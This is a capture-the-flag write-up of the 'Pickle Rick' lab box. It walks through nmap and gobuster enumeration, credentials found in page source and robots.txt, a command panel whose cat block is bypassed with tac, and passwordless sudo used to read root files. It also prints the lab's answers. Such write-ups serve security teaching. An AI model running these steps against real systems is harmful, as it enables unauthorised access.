## Summary

Happy new year everyone! First writeup of the year, an easy box that we have to bypass a simple filter so we can read files. Let's start!

## Enumeration/Reconnaissance

Now as always letâ€™s continue with a nmap scan.

```
$ ip=10.10.200.154
$ nmap -sC -sV -oN nmap/picklerick.thm $ip

```

Once we visit the website we can see a message that tells us to login into his computer and search for the last three secret ingredients for his pickle-reverse potion. Alright, checking the source code i found a username let's note it down `R1ckRul3s`:

```
$ curl -s http://$ip/               

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

Let's fire up a `gobuster` scan now.

```
$ gobuster dir -q -u http://$ip/ -w $medium -x php,txt,html,js -o scans/gobuster.txt  
/index.html (Status: 200)
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
/robots.txt (Status: 200)
```

We have a login page awesome, checking the robots.txt i noticed a weird text message tried as password & i got in! `R1ckRul3:Wubbalubbadubdub`

Now we have access to a command panel and we can execute system commands:

## What is the first ingredient Rick needs?

Running `ls` we can see a file named `Sup3rS3cretPickl3Ingred.txt` we can read it from browser since it's under `/var/www/html`

```
$ curl -s http://$ip/Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```

## Whats the second ingredient Rick needs?

Searching around, i found under `/home/rick` the second ingredient. I tried to used `cat` on it but i got an error:

We can't use `cat` its disabled, but we can use lot of other methods. Like `nl` - `less` - `tac`

```
$ tac /home/rick/second\ ingredients
1 jerry tear
```

## Whats the final ingredient Rick needs?

Checking around for privesc, `sudo -l` says we can run all commands without entering a password.

```
Matching Defaults entries for www-data on ip-10-10-200-154.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-200-154.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

So let's read the final ingredient.

```
$ sudo ls /root
3rd.txt
snap

$ sudo tac /root/3rd.txt
3rd ingredients: fleeb juice
```
